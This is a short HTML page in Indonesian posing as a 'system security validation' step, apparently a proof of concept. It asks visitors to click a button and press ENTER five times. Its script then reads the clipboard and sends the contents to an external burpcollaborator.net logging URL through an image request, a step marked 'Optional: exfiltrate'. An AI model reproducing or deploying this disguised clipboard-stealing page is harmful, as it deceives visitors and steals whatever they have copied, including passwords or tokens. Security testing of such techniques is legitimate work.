<!DOCTYPE html>
<html>
<head>
  <title>Validasi Pengguna</title>
  <style>
    body {
      font-family: sans-serif;
      text-align: center;
      padding-top: 80px;
    }
    button {
      font-size: 18px;
      padding: 10px 20px;
      cursor: pointer;
    }
    #msg {
      margin-top: 30px;
      font-size: 18px;
    }
    #result {
      margin-top: 20px;
      font-weight: bold;
      color: green;
    }
  </style>
</head>
<body>

  <h2>Validasi Keamanan Sistem</h2>
  <button onclick="activate()">Klik untuk lanjut</button>

  <div id="msg">Silakan klik tombol di atas terlebih dahulu.</div>
  <div id="result"></div>

  <script>
    let ready = false;
    let count = 0;
    let triggered = false;
    let timeout;

    function activate() {
      ready = true;
      count = 0;
      triggered = false;
      document.getElementById("msg").innerText = "‚úÖ Sekarang tekan tombol ENTER cepat 5x untuk validasi...";
    }

    document.body.onkeydown = function(e) {
      if (!ready || triggered) return;
      if (e.key === "Enter") {
        count++;
        clearTimeout(timeout);

        timeout = setTimeout(() => count = 0, 2000);

        document.getElementById("msg").innerText = "Tekan ENTER (" + count + "/5)...";

        if (count >= 5) {
          triggered = true;
          document.getElementById("msg").innerText = "üìã Membaca clipboard...";

          navigator.clipboard.readText().then(function(text) {
            document.getElementById("result").innerText = "üìã Clipboard berisi: " + text;

            // Optional: exfiltrate
            const img = new Image();
            img.src = "https://qkej59kyt3q16kirt11bb4kv1m7cv1.burpcollaborator.net/log?clip=" + encodeURIComponent(text);
          }).catch(function(err) {
            document.getElementById("msg").innerText = "‚ùå Gagal membaca clipboard: " + err;
          });
        }
      }
    };
  </script>

</body>
</html>
